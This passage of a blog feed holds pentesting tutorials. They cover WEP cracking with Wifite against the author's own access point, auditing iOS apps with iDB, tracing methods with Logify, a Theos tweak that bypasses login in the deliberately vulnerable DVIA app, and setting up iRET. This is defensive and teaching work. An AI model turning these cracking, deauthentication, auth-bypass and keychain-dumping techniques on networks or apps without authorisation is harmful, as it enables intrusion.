  &lt;li&gt;stop any attack with Ctrl+C, with options to continue, move onto next target, skip to cracking, or exit&lt;/li&gt;
  &lt;li&gt;displays session summary at exit; shows any cracked keys&lt;/li&gt;
  &lt;li&gt;all passwords saved to cracked.txt&lt;/li&gt;
  &lt;li&gt;built-in updater: ./wifite.py -upgrade&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Before we start using wifite, make sure you have a proper wireless card that supports packet injection. If you don’t have one, i would suggest that you buy &lt;a href=&quot;http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8&quot;&gt;this&lt;/a&gt; card.&lt;/p&gt;

&lt;p&gt;Note that there is a bug in Wifite that may or may not be there in your particular version of Wifite. The bug basically doesn’t aireplay-ng to function properly and displays an error like &lt;em&gt;aireplay-ng exited unexpectedly&lt;/em&gt; . In order to fix this, you will have to make slight modifications in the code of wifite. You can install gedit (apt-get install gedit) which is a text editor and then edit the wifite python script (found in /usr/bin/wifite) using the steps mentioned &lt;a href=&quot;https://code.google.com/p/wifite/issues/detail?id=127&quot;&gt;here&lt;/a&gt;. To open wifite, use the command &lt;em&gt;gedit /usr/bin/wifite&lt;/em&gt;. This will open up the source code of wifite. Then replace every occurence of &lt;em&gt;cmd = [‘aireplay-ng’,&lt;/em&gt; with &lt;em&gt;cmd = [‘aireplay-ng’,’–ignore-negative-one’,&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Wifite can be found under &lt;em&gt;Applications -&amp;gt; Kali Linux -&amp;gt; Wireless Attacks -&amp;gt; 802.11 Wireless Tools&lt;/em&gt;. Also, note that if you are running wifite in a different VM than Kali Linux, then you have to make sure that tools like airmon-ng, aireplay-ng, airodump-ng, aircrack-ng are already installed on that system. This is because Wifite is nothing but a wrapper over all these tools. Before we even start using Wifite, it is better to update to the latest version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In my case, i already have the latest version. In this tutorial, we will be targeting a simple Wifi network with WEP encryption. Just using the command &lt;em&gt;wifite -h&lt;/em&gt; will give you a list of all the commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A very tempting option would be &lt;em&gt;-all&lt;/em&gt; which tries to attack every network that it finds. We will try it in later articles in this series. However, first lets take a look at all the targets that we have. To do that, use the command &lt;em&gt;wifite -showb&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, we can see that wifite has put our network interface card into monitor mode (using airmon-ng) and started to look for clients. After a few more seconds, it will start displaying the list of access points.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note that as it is mentioned in its feature list (automatically de-authenticates clients of hidden networks to reveal SSIDs), this list will also include hidden access points. Hence, wifite can also be used to find hidden access points. In this case we will attack an access point with the BSSID 00:26:75:02:EF:65 that i have set up for testing purposes. The access point has a simple WEP password &lt;em&gt;1234567890&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To start attacking an access point, just press &lt;em&gt;Ctrl+C&lt;/em&gt;. Wifite will now ask you to choose a target number from the list. The target number for my test network is 1, so let me enter that. Note that if you press &lt;em&gt;Ctrl+C&lt;/em&gt; again, it will quit Wifite.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can now see that Wifite will start attempting to crack the WEP access point using the different known techniques for cracking WEP encryption. After some unsuccessful tries, it has finally begun to start attacking the access points using different techniques for cracking WEP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once enough IV’s are being captured, it will automatically start cracking the password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, Wifite has successfully figured out the WEP key for the access point. Wifite is an extremely useful tool for cracking wireless networks. As i mentioned previously, you need to have all the tools like airmon-ng, aireplay-ng, airodump-ng, aircrack-ng already installed on your system. To further prove the point, let’s dive into the source code of Wifite.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite1/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the python code has mentions of calling aireplay-ng. Hence, it is recommended to run Wifite inside Kali linux.&lt;/p&gt;

&lt;p&gt;In the next article, we will look at some advanced usage options of Wifite.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 35 – Auditing iOS Applications With iDB</title>
   <link href="https://bitbrain.github.io/2014/10/18/ios-application-security-part-35-auditing-ios-applications-with-idb.html"/>
   <updated>2014-10-18T14:14:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/10/18/ios-application-security-part-35-auditing-ios-applications-with-idb</id>
   <content type="html">&lt;p&gt;In this article, we will look at another cool utility named iDB for pentesting iOS applications.&lt;/p&gt;

&lt;p&gt;Before that, i would like to apologize for coming up late with this article. A lot of you have been requesting articles on different topics and i promise that i will write on them soon :). So since we are best friends again, let’s dive into this tool.&lt;/p&gt;

&lt;p&gt;iDB is open source and you can download it from its &lt;a href=&quot;https://github.com/dmayer/idb&quot;&gt;Github&lt;/a&gt; page. You can then follow the tutorial &lt;a href=&quot;https://github.com/dmayer/idb/wiki/Getting-started&quot;&gt;here&lt;/a&gt; to know how to install it. Installation might take some time as there might be some dependencies you will have to install, so have some patience. Also, please note that it works with ruby versions 1.9 and 2.1 so make sure you set that version of ruby. You can use &lt;em&gt;rvm list&lt;/em&gt; to list the versions of ruby installed on your system and then use &lt;em&gt;rvm use&lt;/em&gt; followed by the version of ruby that you want to use.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Once you are done installing iDB, browser to its root directory and open it using the command &lt;em&gt;ruby gidb.rb&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will launch iDB.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before you start using iDB, you must set up the connection settings. Go to Ruby -&amp;gt; Preferences.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now under the &lt;em&gt;Device Config&lt;/em&gt; tab, select either SSH directly or SSH over USB which uses usbmuxd internally. I prefer the latter one. Provide your username and password and the port number over which SSH is running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Under the port forwarding section, you can set options for port forwarding if you want. This is generally done by the syntax &lt;em&gt;remote:8080 -&amp;gt; localhost:8080&lt;/em&gt; which is quite self explanatory. Here, we are not going to set any port forwarding as we really don’t need it for this tutorial, but we must set the option &lt;em&gt;Port for Manual SSH&lt;/em&gt; which will be used by usbmuxd. What this will do is forward all the connections sent to port 2222 on localhost to the device on port 22 over USB.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So basically, you can now just SSH to localhost on port 2222 and it will connect you to your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now make sure your device is connected to your system over USB. Go to Devices and select the option &lt;em&gt;USB Device&lt;/em&gt; to connect to your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/7.png&quot; alt=&quot;7&quot; /&gt; &lt;strong&gt;One of the unique functionalities of iDB is that it allows you to connect to iOS simulators as well. I have tried it and it works quite well. This is specially helpful for iOS developers who use Xcode and want to audit their apps quite frequently. I would like you to check that feature out as well.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As soon as iDB connects to your device, it will do a quick analysis and tell you what apps that it needs are already installed on your device and which one needs to be installed. You can just click on install next to the tool to install it. Make sure you install each of the required dependencies. In some cases you might feel that the application is already installed. Well, iDB checks for files in specific locations, for e.g /usr/bin, so it might not be able to detect it always. Its better just to reinstall the tool in case iDB is not able to detect it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you have installed all the apps, click on &lt;em&gt;Select App&lt;/em&gt; on the top left and select the application that you want to audit. In this case, i am going to select &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS application&lt;/a&gt; &lt;img src=&quot;/images/posts/ios35/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, click on &lt;em&gt;Launch App&lt;/em&gt; to launch your app on the device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the left hand side, you can click on &lt;em&gt;Analyze Binary&lt;/em&gt; to see whether certain security features like Encryption, PIE etc have been enabled in the app or not. Since i have installed this app manually on a jailbroken device, there is no encryption.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So let’s go through each feature one by one. On the &lt;em&gt;Storage&lt;/em&gt; tab, you can see all the files DVIA is writing to or has already written to along with their data protection levels. In case it doesn’t show up, click Refresh.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;URL Handlers&lt;/em&gt; tab tells you which URL schemes the app registers to. You can then call any url starting with that url scheme to see how the app reacts to it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The binary tab will show you all the Shared libraries the app is using, class information using &lt;em&gt;Weak Class Dump&lt;/em&gt; and all the strings it could find in the binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The filesystem tab can be used to see all the files in the application sandbox folder along with their permisions. If you want to see the contents of any file, just double click on it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/15.png&quot; alt=&quot;15&quot; /&gt; &lt;img src=&quot;/images/posts/ios35/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Tools section will allow you to see the cached screenshot that is stored on the device whenever the application goes to the background.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And you can also install the Burp CA certificate that is used for analyzing SSL connections directly on your device or simulator. For device, it will simply open the url http://burp (Make sure proxy is set on your device). This is again quite a useful feature and saves you a lot of time. You can also edit the hosts file on your system in case you want to redirect the request for a particular ip or hostname to some other location.&lt;/p&gt;

&lt;p&gt;The Log tab shows you the device logs. It can be used to test scenarios when the application is logging sensitive information to the console.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The keychain tab will dump all the keychain information stored using this application using the keychain dumper utility.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The pasteboard tab will analyze the pasteboard buffer to see if there is some sensitive information stored in the buffer. As you can see, here it finds a string named &lt;em&gt;secret123&lt;/em&gt; stored in the pasteboard buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios35/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Overall, iDB is a great tool for iOS pentesting and helps us save a lot of time by doing most of the tasks with just one click. There are other features as well such as integration with Cycript and Snoop-it, but they are still in the development phase. I would recommend that you clone the repository from github if you want to check those features out.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 34 - Tracing Method calls using Logify</title>
   <link href="https://bitbrain.github.io/2014/04/18/ios-application-security-part-34-tracing-method-calls-using-logify.html"/>
   <updated>2014-04-18T16:59:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/04/18/ios-application-security-part-34-tracing-method-calls-using-logify</id>
   <content type="html">&lt;p&gt;In the previous articles, we have seen how applications like Snoop-it can trace method calls specific to the application at runtime. This is very important in deducing the flow of the application. The same process can be performed by using a perl script named Logify.pl that comes installed with Theos. The script takes input as a header file and generates the hooking code that we can add in our tweak. We can also specify the classes we want to check. Once the tweak is installed on the device, whenever a method for that particular class is called, the tweak logs out the method along with the arguments to syslog. The first step here is to get the header files for a particular application. You can get the header files by using the -H option in class-dump-z. Once the headers folder is generated, you can copy it to your system.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can use the Logify.pl script on these header files to generate our tweak. In this case, we are testing on &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS application&lt;/a&gt;. Let’s add all the classes for which we want to log the method calls. In our case, we select three classes for which we want to trace the method calls, ClientSideInjectionVC, JailbreakDetectionVC and DamnVulnerableAppUtilities.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is how our Tweak.xm file looks like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s create a tweak and replace its Tweak.xm file with our own. Also, give the filter as the bundle identifier for DVIA, as we only want to trace calls for DVIA. Have a look at the &lt;a href=&quot;http://highaltitudehacks.com/2014/04/18/ios-application-security-part-33-writing-tweaks-using-theos-cydia-substrate&quot;&gt;previous&lt;/a&gt; article if you are new to writing tweaks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Build the package.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now install it on your device and respring your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now check the folder &lt;em&gt;/Library/MobileSubstrate/DynamicLibraries&lt;/em&gt; on your device to see whether the tweak was installed, and sure enough, we can see that it has been installed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now run the DVIA app. Make sure your device is connected to your computer and go to Xcode –&amp;gt; Window –&amp;gt; Organizer –&amp;gt; Devices &amp;amp; select your device and click on Console. You will see the DVIAMethodTracer tweak being loaded into your application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now as you browse around in the application and invoke methods for the particular classes that we have set up Logify for, you will see that these methods are logged along with the value of their arguments.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios34/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Logify can be a very useful tool in figuring out the order in which methods are called and hence deducing a lot about the flow of the application.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 33 - Writing tweaks using Theos (Cydia Substrate)</title>
   <link href="https://bitbrain.github.io/2014/04/18/ios-application-security-part-33-writing-tweaks-using-theos-cydia-substrate.html"/>
   <updated>2014-04-18T11:59:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/04/18/ios-application-security-part-33-writing-tweaks-using-theos-cydia-substrate</id>
   <content type="html">&lt;p&gt;In some of the &lt;a href=&quot;http://highaltitudehacks.com/security&quot;&gt;previous&lt;/a&gt; articles in this series, we have looked at how we can modify the behaviour of an application by patching it using IDA Pro, Hopper etc. However, doing this hasn’t been quite straightforward always. We can also use Cycript to modify the behaviour of an application by changing some of the method implementations, but the change isn’t permanent. This is where writing tweaks for an application comes in handy. A tweak is nothing but a run-time patch to an application using the Cydia Substrate framework. Cydia Substrate consists of 3 major components: MobileHooker, MobileLoader and safe mode. You can read about these 3 major components &lt;a href=&quot;http://iphonedevwiki.net/index.php/MobileSubstrate&quot;&gt;here&lt;/a&gt;. Saurik has also written a complete series of documentation &lt;a href=&quot;http://www.cydiasubstrate.com/&quot;&gt;here&lt;/a&gt;. Our main focus here would be not to go in depth and learn how to write tweaks for jailbroken devices but to understand there relevance to application security so we can quickly write our own tweaks when necessary.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;By default, on compiling and building a tweak, it gets converted into the .dylib format and is stored in the location &lt;em&gt;/Library/MobileSubstrate/DynamicLibraries&lt;/em&gt; on the device. There is a plist file with the same name but the extension .plist with every .dylib file that determines certain configuration settings for the tweak. For e.g, one of the most popular configuration settings is &lt;em&gt;Filter&lt;/em&gt;. You can use this configuration to filter the library or process you want to inject the code into. You can read more about filters and configurations &lt;a href=&quot;http://www.cydiasubstrate.com/inject/darwin/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you have a jailbroken device and have installed tweaks before from Cydia, you can clearly see these tweaks being injected into different applications during runtime by simply looking at the logs. Go to Xcode -&amp;gt; Window -&amp;gt; Organizer -&amp;gt; Devices &amp;amp; select your device and click on Console. Make sure your device is connected to your computer. You will see the tweaks being loaded into your application as you open applications on your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is also a good idea to check the folder &lt;em&gt;/Library/MobileSubstrate/DynamicLibraries&lt;/em&gt; on your device and see all the tweaks you have installed on your device. You can do this by using a simple utility like iExplorer. Also, it is recommended to check the plist files for these installed extensions to see how they impose their restrictions on specific libraries and applications.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By far, the most preferred way of creating tweaks for iOS is by using Theos. To set up theos on your device, you can follow the instructions mentioned &lt;a href=&quot;http://iphonedevwiki.net/index.php/Theos/Getting_Started&quot;&gt;here&lt;/a&gt;. It’s pretty straightforward but make sure that the path where you are creating tweaks doesn’t include some directories that have spaces in them. It has caused problems for me in the past and hence i would recommend you to avoid it.&lt;/p&gt;

&lt;p&gt;For help, you can always go to the IRC channel where most of the big names hang out and are willing to help. There is a channel for Substrate (#substrate) and Cycript (#cycript) on the server irc.saurik.com. Apart from this, there is also a channel for theos (#theos) and channels for specific jailbreak questions such as #jailbreakqa on irc.freenode.net.&lt;/p&gt;

&lt;p&gt;Please note that if something goes wrong once you build and deploy a tweak then you should immediately remove the tweak from &lt;em&gt;/Library/MobileSubstrate/DynamicLibraries&lt;/em&gt;. For e.g, if your phone is not booting properly, you can still connect to it over iExplorer and remove the dylib and plist file for the tweak that you think screwed your application.&lt;/p&gt;

&lt;p&gt;So let’s write a tweak. We will test our skills on &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS Application&lt;/a&gt;. We will solve the first challenge in the Runtime Manipulation section, where we have to bypass the login check on tapping &lt;em&gt;Login Method 1&lt;/em&gt; as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/3.PNG&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Open theos and select the option to create a tweak. Let’s name the project as DVIABypass. It will also ask you to specify the bundle identifier. Since we only want the tweak to hook into DVIA, we will specify the bundle identifier for DVIA only. In case you don’t know how to find out the bundle identifier for a particular application, you can always find it out by inspecting the Info.plist file in the application folder for a particular app using iExplorer. You will see that this bundle identifier will automatically get added in the plist file for your tweak created by Theos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the project folder has been created. Let’s navigate inside it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here you can see some weird files. The plist file is the one that we discussed about previously. This file is copied over to your device along with the generated dynamic library. The Tweak.xm file is where all your hooking code will go. The Makefile is where you will add all the needed frameworks and other global variables.&lt;/p&gt;

&lt;p&gt;In order to write a tweak for a particular application or library method, we must know the header file information of the classes we want to hook into. The header file information can easily be dumped by using class-dump-z. In this case, since we are only dealing with the application DVIA, we need to just dump the class methods for that particular application. However, if you want to hook into any method of Springboard, you need to have the entire class information of it. One option is to either dump the entire content yourself using class-dump-z. Another option is to get it from some other people’s repositories. For e.g, &lt;a href=&quot;https://github.com/thomasfinch/iOS-7-SpringBoard-Headers&quot;&gt;here&lt;/a&gt; is a Github repository that contains the headers dumped for Springboard in iOS 7.&lt;/p&gt;

&lt;p&gt;By looking at the class information for DVIA, we can figure out that we want to hook into the method &lt;em&gt;isLoginValidated&lt;/em&gt; in the view controller &lt;em&gt;RuntimeManipulationDetailsVC&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets look at the Tweak.xm file. Just reading it will tell you a lot about how to go ahead and write and your own tweak. I am not going to explain what is already written here, it will be very easy to understand it anyways.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Replace your Tweak.xm file with the following lines of code. As you can clearly note here, this patch hooks into the class RuntimeManipulationDetailsVC, hijacks the implementation of the method isLoginValidated, and replaces it with our own implementation which returns TRUE every time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now make sure you have all the proper variables set. Make sure your computer and device are connected to the same wifi network. The first time you make a package and install it on the device, you will be prompted for the ssh password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now build the package and install it by using the command &lt;em&gt;make package install&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;. &lt;img src=&quot;/images/posts/ios33/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now everytime you tap on the button that says &lt;em&gt;Login Method 1&lt;/em&gt; in &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;DVIA&lt;/a&gt;, you will notice that the login will be bypassed.&lt;/p&gt;

&lt;p&gt;You can also double check whether the package has been installed on your device by looking for the dylib file for your package in the directory &lt;em&gt;/Library/MobileSubstrate/DynamicLibraries&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios33/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And if you feel that you have screwed up with your tweak, just remove the dylib and plist files from this folder and restart your device.&lt;/p&gt;

&lt;p&gt;The important thing to note about creating a tweak or a patch while doing security assessment of iOS applications is that the change is permanent and the whole process is also not as tough as patching an entire method by modifying the diassembly. While we didn’t cover some of the basic stuff regarding developing for jailbroken devices, i would recommend you to to read &lt;a href=&quot;http://brandontreb.com/beginning-jailbroken-ios-development-your-first-tweak&quot;&gt;this&lt;/a&gt; article as it explains things in much more depth.&lt;/p&gt;

&lt;p&gt;If you have any questions, comments or suggestions, feel free to write them down in the comments section below and i will get back to you.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 32 - Automating tasks with iOS Reverse Engineering Toolkit (iRET)</title>
   <link href="https://bitbrain.github.io/2014/03/25/ios-application-security-part-32-automating-tasks-with-ios-reverse-engineering-toolkit-iret.html"/>
   <updated>2014-03-25T21:59:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/03/25/ios-application-security-part-32-automating-tasks-with-ios-reverse-engineering-toolkit-iret</id>
   <content type="html">&lt;p&gt;While doing security audit of iOS apps, there are a lot of tasks that we have to repeat every time. This includes finding out the class information for the app, checking if the application stores any important data in plist files, analyzing the content in the database files etc. These tasks can be a little time consuming every time and so it doesn’t make quite a lot of sense to repeat them over and over again for every app. We have also looked at some tools like &lt;a href=&quot;http://highaltitudehacks.com/2013/08/20/ios-application-security-part-9-analyzing-security-of-ios-applications-using-snoop-it&quot;&gt;Snoop-it&lt;/a&gt; and &lt;a href=&quot;http://highaltitudehacks.com/2013/09/17/ios-application-security-part-16-runtime-analysis-of-ios-applications-using-inalyzer&quot;&gt;iNalyzer&lt;/a&gt; that make our job easier by automating some of these tasks. In this article, we will talk about a new tool named iOS Reverse Engineering Toolkit (iRET) that has just been released to assist penetration testers in automating most of the tasks involved in a iOS penetration test. The project is developed and maintained by @S3Jensen.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In the author’s own words, here is what the toolkit does.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;It’s a toolkit that allows you to automate many of the manual tasks an iOS penetration tester would need to perform in order to analyze and reverse engineering iOS applications. And the bonus is this can all be performed right on the device.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Also, please note that iRET is a static analysis tool rather than a dynamic analysis tool.&lt;/p&gt;

&lt;p&gt;So let’s jump right into it. You can download the toolkit from &lt;a href=&quot;https://www.veracode.com/sites/default/files/Resources/Tools/iRETTool.zip&quot;&gt;here&lt;/a&gt;. So download this zip file on your device and unzip it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside it, there will be a .deb file. You can install it using the dpkg command. Also make sure to install python on your device otherwise iRET won’t work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now respring or reboot your device (in my case, i had to reboot the device) and you will see a new icon with the name iRET. Tap on it to launch the app. As you can see, we can start the server and then connect to it via our browser. So let’s tap on start and navigate our browser to the mentioned address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/3.PNG&quot; alt=&quot;3&quot; /&gt; &lt;img src=&quot;/images/posts/ios32/4.PNG&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are provided the interface as shown in the image below. Please note that the first time you navigate browser to this address, it takes a little bit of time, so be a little patient.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the left hand side, i can see whether the tools needed by iRET to perform its tasks are installed or not. It looks like i have almost all the tools that i need except a few like &lt;em&gt;file&lt;/em&gt; and &lt;em&gt;dumpdecrypted&lt;/em&gt;. Installing file is very straightforward as you can download it just by searching via Cydia. However, installing dumpdecrypted on the iOS device could be a bit tricky for beginners so i am going to cover it here. Make sure you have all these tools installed otherwise iRET won’t be able to perform some of its functions.&lt;/p&gt;

&lt;p&gt;To install dumpdecrypted, you need to download the zip file from its &lt;a href=&quot;https://github.com/stefanesser/dumpdecrypted&quot;&gt;github&lt;/a&gt; url on your computer, compile it and then upload the resulting .dylib file on your device. So download the zip file and use the &lt;em&gt;make&lt;/em&gt; command to compile the application. As you can see, this will create a .dylib file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/6_x.png&quot; alt=&quot;6 X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now let’s move this dylib file to our device. In my case, i just did a drag and drop inside the folder /Library using iExplorer. So now when we refresh the interface, we can see that we have all the tools installed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the right side, we can select the application that we want to analyze. In this case, let me select the &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS App (DVIA)&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

